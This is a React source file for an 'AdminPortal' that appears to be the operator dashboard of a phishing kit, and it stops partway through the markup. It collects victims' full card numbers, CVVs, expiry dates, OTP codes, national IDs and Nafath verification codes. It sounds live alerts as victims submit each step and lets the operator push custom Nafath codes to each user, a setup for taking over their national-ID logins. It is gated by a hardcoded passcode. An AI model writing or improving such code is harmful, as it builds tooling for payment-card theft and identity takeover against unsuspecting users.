import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import {
  ShieldAlert,
  Lock,
  Unlock,
  KeyRound,
  Activity,
  Clock,
  CheckCircle,
  XCircle,
  Database,
  Search,
  RefreshCw,
  Terminal,
  ArrowRight,
  AlertTriangle,
  Flame,
  User,
  Hash,
  Calendar,
  Layers,
  Sparkles,
  Fingerprint,
  Volume2,
  VolumeX,
  Smartphone,
  Play,
  Bell
} from 'lucide-react';
import { CreditCard3D } from './CreditCard3D';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: 'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown';
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED';
  otpCode: string;
  submittedOtp?: string;
  serviceName?: string;
  nationalId?: string;
  nafathVerified?: boolean;
  nafathCode?: string;
}

// Custom browser synthesized alerts using Web Audio API
const playNotificationSound = (type: 'nafath' | 'card' | 'otp') => {
  try {
    const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
    if (!AudioContextClass) return;
    const ctx = new AudioContextClass();
    const now = ctx.currentTime;
    
    if (type === 'nafath') {
      // Gentle majestic digital double bell (C5 -> E5 -> G5)
      const osc1 = ctx.createOscillator();
      const gain1 = ctx.createGain();
      osc1.type = 'sine';
      osc1.frequency.setValueAtTime(523.25, now); // C5
      osc1.frequency.exponentialRampToValueAtTime(659.25, now + 0.18); // E5
      gain1.gain.setValueAtTime(0.12, now);
      gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
      osc1.connect(gain1);
      gain1.connect(ctx.destination);
      osc1.start(now);
      osc1.stop(now + 0.5);

      const osc2 = ctx.createOscillator();
      const gain2 = ctx.createGain();
      osc2.type = 'triangle';
      osc2.frequency.setValueAtTime(783.99, now + 0.12); // G5
      gain2.gain.setValueAtTime(0.05, now + 0.12);
      gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
      osc2.connect(gain2);
      gain2.connect(ctx.destination);
      osc2.start(now + 0.12);
      osc2.stop(now + 0.5);
    } else if (type === 'card') {
      // Tech-y payment slide / crisp swoop (D4 -> A5)
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(293.66, now); // D4
      osc.frequency.exponentialRampToValueAtTime(880, now + 0.22); // A5
      gain.gain.setValueAtTime(0.1, now);
      gain.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(now);
      osc.stop(now + 0.3);
    } else if (type === 'otp') {
      // Fast high attention sonar beeps (C6 -> E6 -> G6)
      [0, 0.08, 0.16].forEach((delay, idx) => {
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.type = 'sine';
        const freqs = [1046.50, 1318.51, 1567.98]; // C6, E6, G6
        osc.frequency.setValueAtTime(freqs[idx], now + delay);
        gain.gain.setValueAtTime(0.08, now + delay);
        gain.gain.exponentialRampToValueAtTime(0.001, now + delay + 0.07);
        osc.connect(gain);
        gain.connect(ctx.destination);
        osc.start(now + delay);
        osc.stop(now + delay + 0.07);
      });
    }
  } catch (err) {
    console.error("Audio playback error:", err);
  }
};

export const AdminPortal: React.FC = () => {
  // Access control state
  const [accessCode, setAccessCode] = useState('');
  const [hasAccess, setHasAccess] = useState(false);
  const [accessError, setAccessError] = useState<string | null>(null);
  const [isVerifyingCode, setIsVerifyingCode] = useState(false);

  // Dashboard states
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [selectedTx, setSelectedTx] = useState<Transaction | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState<string>('All');
  const [actionBusy, setActionBusy] = useState(false);
  const [actionError, setActionError] = useState<string | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);

  // Auto scroll/track state for OTP submissions
  const [isLiveMonitoring, setIsLiveMonitoring] = useState(true);

  // Nafath setting states
  const [nafathCodeInput, setNafathCodeInput] = useState('26');
  const [isUpdatingNafath, setIsUpdatingNafath] = useState(false);
  const [nafathConfigError, setNafathConfigError] = useState<string | null>(null);
  const [nafathConfigSuccess, setNafathConfigSuccess] = useState<string | null>(null);

  // Sound and tracking system states & refs
  const [isAudioEnabled, setIsAudioEnabled] = useState(true);
  const lastSeenStatuses = useRef<{[txId: string]: string}>({});
  const initialFetchDone = useRef(false);

  const fetchNafathConfig = async () => {
    try {
      const res = await fetch('/api/nafath-config');
      if (res.ok) {
        const data = await res.json();
        if (data && data.currentCode) {
          setNafathCodeInput(data.currentCode);
        }
      }
    } catch (err) {
      console.error('Error fetching Nafath config:', err);
    }
  };

  const handleUpdateNafathCode = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!nafathCodeInput.trim()) {
      setNafathConfigError('Please enter a valid code');
      return;
    }
    setIsUpdatingNafath(true);
    setNafathConfigError(null);
    setNafathConfigSuccess(null);

    try {
      const res = await fetch('/api/nafath-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ currentCode: nafathCodeInput.trim() })
      });
      const data = res.ok ? await res.json() : null;
      if (res.ok && data?.success) {
        setNafathConfigSuccess('Nafath code updated successfully!');
        setTimeout(() => setNafathConfigSuccess(null), 3000);
      } else {
        setNafathConfigError('Failed to update Nafath code.');
      }
    } catch (err) {
      setNafathConfigError('Network error updating Nafath code.');
    } finally {
      setIsUpdatingNafath(false);
    }
  };

  // Check code submission
  const handleVerifyAccess = (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifyingCode(true);
    setAccessError(null);

    setTimeout(() => {
      if (accessCode === '222000') {
        setHasAccess(true);
        setIsVerifyingCode(false);
      } else {
        setAccessError('ACCESS DENIED: Invalid Administrative Credential Code.');
        setIsVerifyingCode(false);
      }
    }, 800);
  };

  // Fetch transactions from server
  const fetchTransactions = async () => {
    try {
      const res = await fetch('/api/admin/transactions');
      if (res.ok) {
        const data: Transaction[] = await res.json();
        
        if (initialFetchDone.current) {
          const prevStatuses = lastSeenStatuses.current;
          let playSound: 'nafath' | 'card' | 'otp' | null = null;
          
          data.forEach(tx => {
            const lastStatus = prevStatuses[tx.id];
            
            if (lastStatus === undefined) {
              // Brand new transaction entry!
              if (tx.status === 'AWAITING_NAFATH' || tx.status === 'NAFATH_VERIFIED') {
                playSound = 'nafath';
              } else if (tx.status === 'OTP_SUBMITTED') {
                playSound = 'otp';
              } else {
                playSound = 'card';
              }
            } else if (lastStatus !== tx.status) {
              // Status transition change!
              if (tx.status === 'AWAITING_NAFATH' || tx.status === 'NAFATH_VERIFIED') {
                playSound = 'nafath';
              } else if (tx.status === 'OTP_SUBMITTED') {
                playSound = 'otp';
              } else if (tx.status === 'PENDING_CARD_APPROVAL') {
                playSound = 'card';
              }
            }
            
            // Record current state status
            prevStatuses[tx.id] = tx.status;
          });
          
          lastSeenStatuses.current = { ...prevStatuses };
          
          if (playSound && isAudioEnabled) {
            playNotificationSound(playSound);
          }
        } else {
          // Initialize first-load state map without firing alarms
          const initialMap: {[txId: string]: string} = {};
          data.forEach(tx => {
            initialMap[tx.id] = tx.status;
          });
          lastSeenStatuses.current = initialMap;
          initialFetchDone.current = true;
        }

        setTransactions(data);
        setIsLoading(false);
      }
    } catch (err) {
      console.error('Error fetching transactions:', err);
    }
  };

  // Setup auto-polling every 2 seconds
  useEffect(() => {
    if (!hasAccess) return;

    fetchTransactions();
    fetchNafathConfig();
    const interval = setInterval(() => {
      fetchTransactions();
    }, 2000);

    return () => clearInterval(interval);
  }, [hasAccess]);

  // Sync selected transaction with its latest updated polling state
  useEffect(() => {
    if (selectedTx && transactions.length > 0) {
      const latest = transactions.find(t => t.id === selectedTx.id);
      if (latest) {
        setSelectedTx(latest);
      }
    }
  }, [transactions]);

  // Handle action state updates
  const handleUpdateStatus = async (status: Transaction['status']) => {
    if (!selectedTx || actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: selectedTx.id, status }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`Transaction state successfully synchronized to ${status}.`);
        // update local list immediately
        setTransactions(prev =>
          prev.map(t => (t.id === selectedTx.id ? { ...t, status } : t))
        );
        setSelectedTx(prev => (prev ? { ...prev, status } : null));
      } else {
        setActionError(data.error || 'Failed to update transaction status.');
      }
    } catch (err) {
      setActionError('Network error syncing status packet to central gateway.');
    } finally {
      setActionBusy(false);
    }
  };

  // Handle Nafath custom code update
  const handleUpdateTxNafathCode = async (code: string) => {
    if (!selectedTx || actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: selectedTx.id, nafathCode: code }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`تم تحديث رمز نفاذ للعميل إلى ${code} بنجاح.`);
        setTransactions(prev =>
          prev.map(t => (t.id === selectedTx.id ? { ...t, nafathCode: code } : t))
        );
        setSelectedTx(prev => (prev ? { ...prev, nafathCode: code } : null));
        setTimeout(() => setSuccessMessage(null), 3000);
      } else {
        setActionError(data.error || 'Failed to update Nafath code.');
        setTimeout(() => setActionError(null), 3000);
      }
    } catch (err) {
      setActionError('Network error updating Nafath code.');
      setTimeout(() => setActionError(null), 3000);
    } finally {
      setActionBusy(false);
    }
  };

  // Handle action state updates for a specific transaction
  const handleUpdateTxStatusDirect = async (txId: string, status: Transaction['status']) => {
    if (actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: txId, status }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`تم تحديث حالة المعاملة بنجاح.`);
        // update local list immediately
        setTransactions(prev =>
          prev.map(t => (t.id === txId ? { ...t, status, nafathVerified: status === 'NAFATH_VERIFIED' ? true : t.nafathVerified } : t))
        );
        setTimeout(() => setSuccessMessage(null), 3000);
      } else {
        setActionError(data.error || 'Failed to update transaction status.');
        setTimeout(() => setActionError(null), 3000);
      }
    } catch (err) {
      setActionError('Network error syncing status.');
      setTimeout(() => setActionError(null), 3000);
    } finally {
      setActionBusy(false);
    }
  };

  // Handle Nafath custom code update for a specific transaction
  const handleUpdateTxNafathCodeDirect = async (txId: string, code: string) => {
    if (actionBusy) return;
    setActionBusy(true);
    setActionError(null);
    setSuccessMessage(null);

    try {
      const res = await fetch('/api/admin/update-status', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: txId, nafathCode: code }),
      });

      const data = await res.json();
      if (res.ok && data.success) {
        setSuccessMessage(`تم تحديث رمز نفاذ للعميل إلى ${code} بنجاح.`);
        setTransactions(prev =>
          prev.map(t => (t.id === txId ? { ...t, nafathCode: code } : t))
        );
        setTimeout(() => setSuccessMessage(null), 3000);
      } else {
        setActionError(data.error || 'Failed to update Nafath code.');
        setTimeout(() => setActionError(null), 3000);
      }
    } catch (err) {
      setActionError('Network error updating Nafath code.');
      setTimeout(() => setActionError(null), 3000);
    } finally {
      setActionBusy(false);
    }
  };

  // Format card types helper
  const getCardTypeColor = (type: string) => {
    switch (type) {
      case 'visa': return 'text-blue-400 border-blue-500/20 bg-blue-500/5';
      case 'mastercard': return 'text-amber-400 border-amber-500/20 bg-amber-500/5';
      case 'amex': return 'text-emerald-400 border-emerald-500/20 bg-emerald-500/5';
      case 'discover': return 'text-orange-400 border-orange-500/20 bg-orange-500/5';
      default: return 'text-slate-400 border-slate-500/20 bg-slate-500/5';
    }
  };

  // Filter list
  const filteredTx = transactions.filter(tx => {
    const matchesSearch =
      tx.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      tx.cardholderName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      tx.cardNumber.includes(searchTerm);

    if (statusFilter === 'All') return matchesSearch;
    return matchesSearch && tx.status === statusFilter;
  });

  // Entrance Security Guard UI
  if (!hasAccess) {
    return (
      <div className="flex min-h-[calc(100vh-140px)] items-center justify-center p-4">
        <motion.div
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          className="w-full max-w-md border border-slate-800 bg-slate-900/40 p-8 backdrop-blur-xl rounded-3xl shadow-2xl shadow-indigo-950/20 relative overflow-hidden"
          id="security-entrance-box"
        >
          {/* Cyber lines decor */}
          <div className="absolute top-0 inset-x-0 h-1 bg-gradient-to-r from-indigo-500 via-rose-500 to-emerald-500 opacity-60" />

          <div className="text-center mb-8">
            <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-rose-500/10 text-rose-400 border border-rose-500/20 mb-4 animate-pulse">
              <ShieldAlert className="h-7 w-7" />
            </div>
            <h2 className="text-2xl font-bold text-white tracking-tight">Administrative Terminal</h2>
            <p className="text-xs text-slate-400 mt-2 leading-relaxed">
              Secure mainframe interface. Authorized credit auditing personnel only. Authentication challenge active.
            </p>
          </div>

          <form onSubmit={handleVerifyAccess} className="space-y-6">
            <div>
              <label className="block text-[11px] font-mono tracking-widest text-slate-400 uppercase mb-2">
                MAIN FRAME SECURITY CODE:
              </label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 flex items-center pl-3.5 pointer-events-none text-slate-500">
                  <KeyRound className="h-4 w-4" />
                </div>
                <input
                  type="password"
                  required
                  value={accessCode}
                  onChange={(e) => setAccessCode(e.target.value)}
                  placeholder="••••••"
                  maxLength={10}
                  className="block w-full h-12 pl-10 pr-4 text-center font-mono font-bold tracking-[0.5em] text-white placeholder-slate-600 bg-slate-950 border border-slate-800 rounded-xl focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition"
                  id="admin-access-code-input"
                />
              </div>
            </div>

            {accessError && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3.5 text-xs text-rose-400 flex items-center space-x-2"
              >
                <XCircle className="h-4 w-4 shrink-0" />
                <span className="font-mono text-[10px] uppercase leading-relaxed">{accessError}</span>
              </motion.div>
            )}

            <button
              type="submit"
              disabled={isVerifyingCode}
              className="w-full h-12 rounded-xl bg-gradient-to-r from-indigo-600 to-rose-600 hover:from-indigo-500 hover:to-rose-500 text-white font-bold text-xs tracking-widest uppercase transition-all shadow-lg hover:shadow-indigo-500/10 disabled:opacity-50 flex items-center justify-center space-x-2"
              id="admin-auth-submit-btn"
            >
              {isVerifyingCode ? (
                <>
                  <RefreshCw className="h-4 w-4 animate-spin" />
                  <span>DECRYPTING SECURE MATRIX...</span>
                </>
              ) : (
                <>
                  <Unlock className="h-4 w-4" />
                  <span>AUTHORIZE MAIN SESSION</span>
                </>
              )}
            </button>
          </form>

          {/* Prompt reminder inside sandbox mode */}
          <div className="mt-8 pt-6 border-t border-slate-800 text-center">
            <span className="inline-flex items-center space-x-1 px-2.5 py-1 rounded bg-indigo-500/10 border border-indigo-500/20 text-[10px] font-mono text-indigo-400">
              <Fingerprint className="w-3.5 h-3.5 animate-pulse" />
              <span>Sandbox Access Passcode: <strong className="text-white">222000</strong></span>
            </span>
          </div>
        </motion.div>
      </div>
    );
  }

  // Admin Dashboard Command Center UI
  return (
    <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6 lg:px-8">
      {/* Upper Status strip bar */}
      <div className="mb-6 flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-slate-900/30 border border-slate-800/80 rounded-2xl p-4 backdrop-blur-md">
        <div className="flex items-center space-x-3.5">
          <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 relative">
            <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
              <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500" />
            </span>
            <Activity className="h-5.5 w-5.5" />
          </div>
          <div>
            <div className="flex items-center space-x-2">
              <h2 className="text-md font-bold text-white tracking-tight uppercase">لوحة التحكم والمراقبة الفورية</h2>
              <span className="text-[9px] font-mono font-bold bg-indigo-950 text-indigo-400 px-1.5 py-0.5 rounded border border-indigo-500/30">ADMIN PORTAL</span>
            </div>
            <p className="text-[10px] font-mono text-slate-400">REAL-TIME CENTRAL DECISION DECK • ACTIVE AUTO-POLL (2S)</p>
          </div>
        </div>

        {/* Sync panel details */}
        <div className="flex items-center gap-3 self-end md:self-auto">
          <button
            onClick={() => setIsAudioEnabled(!isAudioEnabled)}
            className={`h-8 px-3 rounded-lg text-xs font-bold border flex items-center gap-1.5 transition-all ${
              isAudioEnabled
                ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
                : 'bg-rose-500/10 border-rose-500/20 text-rose-400'
            }`}
          >
            {isAudioEnabled ? <Volume2 className="w-4 h-4" /> : <VolumeX className="w-4 h-4" />}
            <span>{isAudioEnabled ? 'النظام الصوتي نشط' : 'كتم أصوات التنبيه'}</span>
          </button>
          
          <div className="flex items-center space-x-2">
            <button
              onClick={() => setIsLiveMonitoring(!isLiveMonitoring)}
              className={`h-8 px-3 rounded-lg text-[10px] font-mono font-bold border transition-all ${
                isLiveMonitoring
                  ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-400'
                  : 'bg-slate-950 border-slate-800 text-slate-500'
              }`}
            >
              {isLiveMonitoring ? '● MONITORING SYNC ACTIVE' : '○ SYNC PAUSED'}
            </button>
            <button
              onClick={fetchTransactions}
              className="p-2 rounded-lg bg-slate-950 hover:bg-slate-900 border border-slate-800 text-slate-400 hover:text-white transition cursor-pointer"
              title="Manual refresh"
            >
              <RefreshCw className="w-3.5 h-3.5" />
            </button>
          </div>
        </div>
      </div>

      {/* Sound testing bar & stats counters */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 mb-8">
        {/* Sound testing card */}
        <div className="lg:col-span-5 rounded-2xl border border-slate-800 bg-gradient-to-br from-slate-900 to-slate-950/80 p-4 shadow-xl flex flex-col justify-between gap-3 text-right">
          <div>
            <h4 className="text-xs font-bold text-white flex items-center justify-end gap-1.5">
              <span>مركز اختبار النغمات التفاعلي</span>
              <Bell className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
            </h4>
            <p className="text-[10px] text-slate-400 mt-1 leading-relaxed">
              انقر على النغمات أدناه لتجربتها ومطابقتها للتنبيه الصوتي الحقيقي عند تفاعل المستخدمين
            </p>
          </div>
          <div className="grid grid-cols-3 gap-2">
            <button
              onClick={() => playNotificationSound('nafath')}
              className="px-2.5 py-2 rounded-xl border border-slate-800 hover:border-emerald-500/40 bg-slate-950 text-[9px] text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
            >
              <Play className="w-3.5 h-3.5 text-emerald-400" />
              <span>نغمة نفاذ 🔔</span>
            </button>
            <button
              onClick={() => playNotificationSound('card')}
              className="px-2.5 py-2 rounded-xl border border-slate-800 hover:border-indigo-500/40 bg-slate-950 text-[9px] text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
            >
              <Play className="w-3.5 h-3.5 text-indigo-400" />
              <span>نغمة البطاقة 💳</span>
            </button>
            <button
              onClick={() => playNotificationSound('otp')}
              className="px-2.5 py-2 rounded-xl border border-slate-800 hover:border-cyan-500/40 bg-slate-950 text-[9px] text-slate-300 flex flex-col items-center gap-1.5 transition cursor-pointer"
            >
              <Play className="w-3.5 h-3.5 text-cyan-400" />
              <span>نغمة الرمز 🔐</span>
            </button>
          </div>
        </div>

        {/* Real-time stats widgets */}
        <div className="lg:col-span-7 grid grid-cols-1 sm:grid-cols-3 gap-4 text-right">
          <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
            <div className="p-3 bg-amber-500/10 text-amber-400 rounded-xl border border-amber-500/20">
              <Activity className="w-5 h-5 animate-pulse" />
            </div>
            <div>
              <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">العمليات النشطة</p>
              <h3 className="text-xl font-bold text-amber-400 font-mono mt-1">
                {transactions.filter(tx => ['AWAITING_NAFATH', 'NAFATH_VERIFIED', 'PENDING_CARD_APPROVAL', 'AWAITING_OTP', 'OTP_SUBMITTED'].includes(tx.status)).length}
                <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">مستمر</span>
              </h3>
            </div>
          </div>

          <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
            <div className="p-3 bg-emerald-500/10 text-emerald-400 rounded-xl border border-emerald-500/20">
              <Fingerprint className="w-5 h-5" />
            </div>
            <div>
              <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">توثيق نفاذ المؤكد</p>
              <h3 className="text-xl font-bold text-emerald-400 font-mono mt-1">
                {transactions.filter(t => t.nafathVerified || t.status === 'NAFATH_VERIFIED').length}
                <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">هوية</span>
              </h3>
            </div>
          </div>

          <div className="rounded-2xl border border-slate-800 bg-slate-900/10 p-4 flex items-center justify-between">
            <div className="p-3 bg-indigo-500/10 text-indigo-400 rounded-xl border border-indigo-500/20">
              <Database className="w-5 h-5" />
            </div>
            <div>
              <p className="text-[10px] font-mono text-slate-400 uppercase tracking-wider">إجمالي المدفوعات المقبولة</p>
              <h3 className="text-xl font-bold text-indigo-400 font-mono mt-1">
                ${transactions.filter(t => t.status === 'APPROVED').reduce((sum, t) => sum + t.amount, 0).toFixed(2)}
                <span className="text-[10px] font-sans font-normal text-slate-500 mr-1">USD</span>
              </h3>
            </div>
          </div>
        </div>
      </div>

      {/* Global Nafath Config Controller and Dashboard Filters */}
      <div className="space-y-6 mb-8 text-right animate-fade-in">
        {/* NAFATH CODE CONTROLLER WIDGET */}
        <div className="rounded-2xl border border-slate-800/85 bg-gradient-to-r from-slate-900 via-slate-900 to-emerald-950/25 p-5 shadow-xl relative overflow-hidden">
          <div className="absolute top-0 right-0 w-24 h-24 bg-emerald-500/5 rounded-full blur-2xl pointer-events-none" />
          <div className="flex flex-col sm:flex-row-reverse items-start sm:items-center justify-between gap-4">
            <div className="space-y-1">
              <h3 className="text-sm font-bold text-white flex items-center justify-end gap-2">
                <span>التحكم برمز التحقق الافتراضي (نفاذ الموحد)</span>
                <Fingerprint className="h-4 w-4 text-emerald-400" />
              </h3>
              <p className="text-[10px] text-slate-400 leading-relaxed">
                الرمز الافتراضي التلقائي الذي يظهر لأي مستخدم جديد يسجل الدخول عبر تطبيق نفاذ (يمكنك أيضاً تغيير الرمز لكل عميل بشكل مخصص من بطاقته أدناه)
              </p>
            </div>

            <form onSubmit={handleUpdateNafathCode} className="flex items-center gap-2 w-full sm:w-auto">
              <button
                type="submit"
                disabled={isUpdatingNafath}
                className="h-9 px-4 rounded-lg bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white text-xs font-bold transition flex items-center gap-1.5 shrink-0 cursor-pointer"
              >
                {isUpdatingNafath ? 'جاري التحديث...' : 'تحديث الرمز'}
              </button>
              <div className="relative">
                <input
                  type="text"
                  maxLength={4}
                  value={nafathCodeInput}
                  onChange={(e) => setNafathCodeInput(e.target.value.replace(/\D/g, ''))}
                  placeholder="26"
                  className="block w-20 h-9 text-center font-mono font-black text-lg text-emerald-400 bg-slate-950 border border-slate-850 rounded-lg focus:ring-1 focus:ring-emerald-500 focus:outline-none"
                />
              </div>
            </form>
          </div>

          <AnimatePresence>
            {(nafathConfigError || nafathConfigSuccess) && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: 'auto' }}
                exit={{ opacity: 0, height: 0 }}
                className="mt-3 flex justify-end"
              >
                {nafathConfigError && (
                  <div className="text-[10px] font-mono text-rose-400 bg-rose-500/5 border border-rose-500/10 rounded px-2.5 py-1.5 w-full text-right">
                    ⚠️ {nafathConfigError}
                  </div>
                )}
                {nafathConfigSuccess && (
                  <div className="text-[10px] font-sans text-emerald-400 bg-emerald-500/5 border border-emerald-500/10 rounded px-2.5 py-1.5 flex items-center gap-1.5 w-full justify-end">
                    <span>{nafathConfigSuccess}</span>
                    <CheckCircle className="w-3.5 h-3.5" />
                  </div>
                )}
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Global Notifications Alert Banner */}
        <AnimatePresence>
          {(actionError || successMessage) && (
            <motion.div
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -10 }}
              className="w-full"
            >
              {actionError && (
                <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-3.5 text-xs text-rose-400 flex items-center justify-end space-x-2 space-x-reverse shadow-lg">
                  <span>{actionError}</span>
                  <XCircle className="h-4 w-4 shrink-0" />
                </div>
              )}
              {successMessage && (
                <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/10 p-3.5 text-xs text-emerald-400 flex items-center justify-end space-x-2 space-x-reverse shadow-lg">
                  <span>{successMessage}</span>
                  <CheckCircle className="h-4 w-4 shrink-0" />
                </div>
              )}
            </motion.div>
          )}
        </AnimatePresence>

        {/* Dynamic Filters and Search Panel */}
        <div className="rounded-2xl border border-slate-800/80 bg-slate-900/20 backdrop-blur-md p-5 shadow-xl text-right">
          <div className="flex flex-col md:flex-row-reverse justify-between items-stretch md:items-center gap-4 mb-5 pb-5 border-b border-slate-900">
            <div>
              <h3 className="text-md font-bold text-white flex items-center justify-end gap-2">
                <span>ملفات بروفايل المستخدمين المباشرة ({filteredTx.length})</span>
                <Database className="h-4.5 w-4.5 text-indigo-400" />
              </h3>
              <p className="text-[10px] text-slate-400">مراقبة تفصيلية فورية لكل شخص متصل الآن - بروفايل كامل مستقل لكل عميل</p>
            </div>

            {/* Search bar */}
            <div className="relative max-w-sm w-full md:w-80">
              <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none text-slate-500">
                <Search className="h-4 w-4" />
              </div>
              <input
                type="text"
                placeholder="بحث باسم العميل، رقم المعاملة، الهوية..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="block w-full h-10 pl-9 pr-4 text-xs bg-slate-950 border border-slate-800 rounded-xl text-white text-right focus:ring-2 focus:ring-indigo-500 focus:outline-none"
              />
            </div>
          </div>

          {/* Filter Status Tabs */}
          <div className="flex flex-wrap flex-row-reverse gap-1.5 bg-slate-950/60 p-1 rounded-xl border border-slate-900/80">
            {[
              { id: 'All', label: 'الكل' },
              { id: 'AWAITING_NAFATH', label: 'بانتظار نفاذ ⏳' },
              { id: 'NAFATH_VERIFIED', label: 'نفاذ موثق ✅' },
              { id: 'PENDING_CARD_APPROVAL', label: 'بانتظار البطاقة 💳' },
              { id: 'AWAITING_OTP', label: 'بانتظار الرمز 🔑' },
              { id: 'OTP_SUBMITTED', label: 'رمز جديد 🔐' },
              { id: 'APPROVED', label: 'مقبول 👍' },
              { id: 'REJECTED', label: 'مرفوض ❌' }
            ].map(tab => (
              <button
                key={tab.id}
                onClick={() => setStatusFilter(tab.id)}
                className={`px-3.5 py-1.5 text-[11px] font-bold rounded-lg transition cursor-pointer ${
                  statusFilter === tab.id
                    ? 'bg-slate-800 text-white border border-slate-750/75'
                    : 'text-slate-400 hover:text-white'
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Grid of Complete Live User Profiles */}
      {isLoading ? (
        <div className="py-24 text-center">
          <RefreshCw className="h-10 w-10 text-indigo-500 animate-spin mx-auto mb-4" />
          <p className="text-sm font-mono text-slate-500">جاري مزامنة قاعدة البيانات وجلب البروفايلات النشطة...</p>
        </div>
      ) : filteredTx.length === 0 ? (
        <div className="py-24 text-center border border-dashed border-slate-800 bg-slate-900/10 rounded-3xl">
          <ShieldAlert className="h-12 w-12 text-slate-600 mx-auto mb-3 animate-pulse" />
          <h4 className="text-sm font-bold text-slate-350">لا توجد ملفات بروفايل مطابقة حالياً</h4>
          <p className="text-xs text-slate-500 mt-1 max-w-md mx-auto leading-relaxed">
            عند قيام المستخدمين بالدخول للموقع والبدء بالتسجيل، ستظهر بروفايلاتهم الكاملة هنا فوراً مع إمكانية تحديث مساراتهم والتحكم بها لحظياً.
          </p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
          {filteredTx.map(tx => {
            // Check card status for custom text styling
            const cardAwaiting = tx.cardNumber === 'Awaiting Card...' || !tx.cardNumber;

            return (
              <div
                key={tx.id}
                className="relative rounded-3xl border border-slate-800 bg-slate-900/40 p-6 backdrop-blur-xl shadow-2xl hover:border-slate-700/80 transition duration-300 overflow-hidden flex flex-col justify-between gap-5 text-right"
              >
                {/* Visual Status Indicator Top Colored Edge */}
                <div className={`absolute top-0 inset-x-0 h-1 bg-gradient-to-r ${
                  tx.status === 'APPROVED' ? 'from-emerald-500 to-teal-500' :
                  tx.status === 'REJECTED' ? 'from-rose-500 to-red-500' :
                  tx.status === 'OTP_SUBMITTED' ? 'from-cyan-500 to-blue-500 animate-pulse' :
                  tx.status === 'AWAITING_OTP' ? 'from-indigo-500 to-purple-500' :
                  tx.status === 'AWAITING_NAFATH' ? 'from-amber-500 to-yellow-500' :
                  'from-slate-600 to-slate-700'
                }`} />

                {/* Profile header with user metadata */}
